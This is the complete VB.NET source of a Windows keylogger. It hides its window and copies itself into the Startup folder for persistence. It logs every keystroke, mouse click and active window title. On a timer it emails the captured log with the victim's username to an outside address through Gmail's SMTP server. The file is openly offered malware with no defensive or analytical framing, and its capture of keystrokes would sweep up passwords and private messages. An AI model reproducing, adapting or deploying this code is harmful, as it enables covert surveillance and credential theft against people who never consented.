Imports System.Web
Imports System.IO
Imports System.Net.Mail
Public Class Form1
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Int32) As Int16
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
    Dim strin As String = Nothing
    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
    Dim AppPath As String = Application.ExecutablePath
    Dim AutoStart As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "/" & IO.Path.GetFileName(AppPath)     'Needed for statrup
    Dim HideFile As IO.FileInfo = My.Computer.FileSystem.GetFileInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup))   'Needed for startup
    Private Function GetActiveWindowTitle() As String
        Dim MyStr As String
        MyStr = New String(Chr(0), 100)
        GetWindowText(GetForegroundWindow, MyStr, 100)
        MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)
        Return MyStr
    End Function


    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Me.Hide()
        Try
            IO.File.Copy(AppPath, AutoStart)
            HideFile.IsReadOnly = True
            HideFile.Attributes = HideFile.Attributes Or IO.FileAttributes.Hidden
        Catch : End Try
        Timer1.Start()
        Timer2.Start()
        Timer3.Start()
    End Sub
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Dim key As Integer
        For i = 1 To 255
            key = 0
            key = GetAsyncKeyState(i)
            If key = -32767 Then
                Select Case i
                    Case 1
                        RichTextBox1.Text += "[LeftClick]"
                    Case 2
                        RichTextBox1.Text += "[RightClick]"
                    Case 32
                        RichTextBox1.Text += " "
                    Case 8
                        RichTextBox1.Text = RichTextBox1.Text.Substring(0, RichTextBox1.Text.Length - 1)
                    Case 9
                        RichTextBox1.Text += "[Tab]"

                    Case 11
                        RichTextBox1.Text += "[Vertical Tab]"

                    Case 13
                        RichTextBox1.Text += vbNewLine
                    Case 112
                        RichTextBox1.Text += "[F1]"
                    Case 113
                        RichTextBox1.Text += "[F2]"
                    Case 114
                        RichTextBox1.Text += "[F3]"
                    Case 115
                        RichTextBox1.Text += "[F4]"
                    Case 116
                        RichTextBox1.Text += "[F5]"
                    Case 117
                        RichTextBox1.Text += "[F6]"
                    Case 118
                        RichTextBox1.Text += "[F7]"
                    Case 119
                        RichTextBox1.Text += "[F8]"
                    Case 120
                        RichTextBox1.Text += "[F9]"
                    Case 121
                        RichTextBox1.Text += "[F10]"
                    Case 122
                        RichTextBox1.Text += "[F11]"
                    Case 123
                        RichTextBox1.Text += "[F12]"

                    Case 160
                        RichTextBox1.Text += "[Left Shift]"
                    Case 161
                        RichTextBox1.Text += "[Right Shift]"

                    Case 164
                        RichTextBox1.Text += "[Alt]"
                    Case 165
                        RichTextBox1.Text += "[Alt Gr]"


                        'Case 14
                        ' RichTextBox1.Text += "[Shift Out]"
                        'Case 15
                        'RichTextBox1.Text += "[Shift In]"
                        'Case 16
                        'RichTextBox1.Text += "[Shift]"
                        'Case 17
                        'RichTextBox1.Text += "[Device Control1]"
                        'Case 18
                        ' RichTextBox1.Text += "[Alt Device Control2]"
                        'Case 19
                        'RichTextBox1.Text += "[Device Control3]"
                        'Case 20
                        'RichTextBox1.Text += "[Capslock]"
                        'Case 21
                        'RichTextBox1.Text += "[Negative Aknowledgement]"
                        'Case 22
                        ' RichTextBox1.Text += "[Synchronous Idle]"
                        ' Case 23
                        '  RichTextBox1.Text += "[End of Transmitblock]"
                        ''Case 24
                        'RichTextBox1.Text += "[Cancel]"
                        ''Case 25
                        'RichTextBox1.Text += "[End of Medium]"
                        ''Case 26
                        'RichTextBox1.Text += "[Substitute]"
                    Case 27
                        RichTextBox1.Text += "[Esc]"

                    Case 127
                        RichTextBox1.Text += "[Delete]"

                    Case 161
                        RichTextBox1.Text += "[Right Shift]"
                End Select
                If My.Computer.Keyboard.AltKeyDown Then
                    Select Case i
                        Case 48
                            RichTextBox1.Text += "}"
                        Case 49
                            RichTextBox1.Text += "|"
                        Case 50
                            RichTextBox1.Text += "@"
                        Case 51
                            RichTextBox1.Text += "#"
                        Case 54
                            RichTextBox1.Text += "^"
                        Case 57
                            RichTextBox1.Text += "{"
                    End Select
                ElseIf My.Computer.Keyboard.ShiftKeyDown OrElse My.Computer.Keyboard.CapsLock Then
                    Select Case i
                        Case 48
                            RichTextBox1.Text += ")"
                        Case 49
                            RichTextBox1.Text += "!"
                        Case 50
                            RichTextBox1.Text += "@"
                        Case 51
                            RichTextBox1.Text += "#"
                        Case 52
                            RichTextBox1.Text += "$"
                        Case 53
                            RichTextBox1.Text += "%"
                        Case 54
                            RichTextBox1.Text += "^"
                        Case 5
                            RichTextBox1.Text += "&"
                        Case 56
                            RichTextBox1.Text += "*"
                        Case 57
                            RichTextBox1.Text += "("


                        Case 65
                            RichTextBox1.Text += "A"
                        Case 66
                            RichTextBox1.Text += "B"
                        Case 67
                            RichTextBox1.Text += "C"
                        Case 68
                            RichTextBox1.Text += "D"
                        Case 69
                            RichTextBox1.Text += "E"
                        Case 70
                            RichTextBox1.Text += "F"
                        Case 71
                            RichTextBox1.Text += "G"
                        Case 72
                            RichTextBox1.Text += "H"
                        Case 73
                            RichTextBox1.Text += "I"
                        Case 74
                            RichTextBox1.Text += "J"
                        Case 75
                            RichTextBox1.Text += "K"
                        Case 76
                            RichTextBox1.Text += "L"
                        Case 77
                            RichTextBox1.Text += "M"
                        Case 78
                            RichTextBox1.Text += "N"
                        Case 79
                            RichTextBox1.Text += "O"
                        Case 80
                            RichTextBox1.Text += "P"
                        Case 81
                            RichTextBox1.Text += "Q"
                        Case 82
                            RichTextBox1.Text += "R"
                        Case 83
                            RichTextBox1.Text += "S"
                        Case 84
                            RichTextBox1.Text += "T"
                        Case 85
                            RichTextBox1.Text += "U"
                        Case 86
                            RichTextBox1.Text += "V"
                        Case 87
                            RichTextBox1.Text += "W"
                        Case 88
                            RichTextBox1.Text += "X"
                        Case 89
                            RichTextBox1.Text += "Y"
                        Case 90
                            RichTextBox1.Text += "Z"
                    End Select
                Else
                    Select Case i
                        Case 65
                            RichTextBox1.Text += "a"
                        Case 66
                            RichTextBox1.Text += "b"
                        Case 67
                            RichTextBox1.Text += "c"
                        Case 68
                            RichTextBox1.Text += "d"
                        Case 69
                            RichTextBox1.Text += "e"
                        Case 70
                            RichTextBox1.Text += "f"
                        Case 71
                            RichTextBox1.Text += "g"
                        Case 72
                            RichTextBox1.Text += "h"
                        Case 73
                            RichTextBox1.Text += "i"
                        Case 74
                            RichTextBox1.Text += "j"
                        Case 75
                            RichTextBox1.Text += "k"
                        Case 76
                            RichTextBox1.Text += "l"
                        Case 77
                            RichTextBox1.Text += "m"
                        Case 78
                            RichTextBox1.Text += "n"
                        Case 79
                            RichTextBox1.Text += "o"
                        Case 80
                            RichTextBox1.Text += "p"
                        Case 81
                            RichTextBox1.Text += "q"
                        Case 82
                            RichTextBox1.Text += "r"
                        Case 83
                            RichTextBox1.Text += "s"
                        Case 84
                            RichTextBox1.Text += "t"
                        Case 85
                            RichTextBox1.Text += "u"
                        Case 86
                            RichTextBox1.Text += "v"
                        Case 87
                            RichTextBox1.Text += "w"
                        Case 88
                            RichTextBox1.Text += "x"
                        Case 89
                            RichTextBox1.Text += "y"
                        Case 90
                            RichTextBox1.Text += "z"

                        Case 48
                            RichTextBox1.Text += "0"
                        Case 49
                            RichTextBox1.Text += "1"
                        Case 50
                            RichTextBox1.Text += "2"
                        Case 51
                            RichTextBox1.Text += "3"
                        Case 52
                            RichTextBox1.Text += "4"
                        Case 53
                            RichTextBox1.Text += "5"
                        Case 54
                            RichTextBox1.Text += "6"
                        Case 55
                            RichTextBox1.Text += "7"
                        Case 56
                            RichTextBox1.Text += "8"
                        Case 57
                            RichTextBox1.Text += "9"


                    End Select
                End If

            End If
        Next i
    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        Dim MyMailMessage As New MailMessage()
        MyMailMessage.From = New MailAddress("my@gmail.com")
        MyMailMessage.To.Add("my@gmail.com")
        MyMailMessage.Subject = (Environment.UserName + " Data " + System.DateTime.Now())
        MyMailMessage.Body = RichTextBox1.Text
        Dim SMTPServer As New SmtpClient("smtp.gmail.com")
        SMTPServer.Port = 587
        SMTPServer.Credentials = New System.Net.NetworkCredential("mail@mail.com", "Password")
        SMTPServer.EnableSsl = True
        SMTPServer.Send(MyMailMessage)
        RichTextBox1.Text = ("")
    End Sub

    Private Sub Timer3_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer3.Tick
        If strin <> GetActiveWindowTitle() Then
            RichTextBox1.Text = RichTextBox1.Text & vbNewLine & "[---" & GetActiveWindowTitle() & "---]" & vbNewLine
            strin = GetActiveWindowTitle()
        End If
    End Sub
End Class
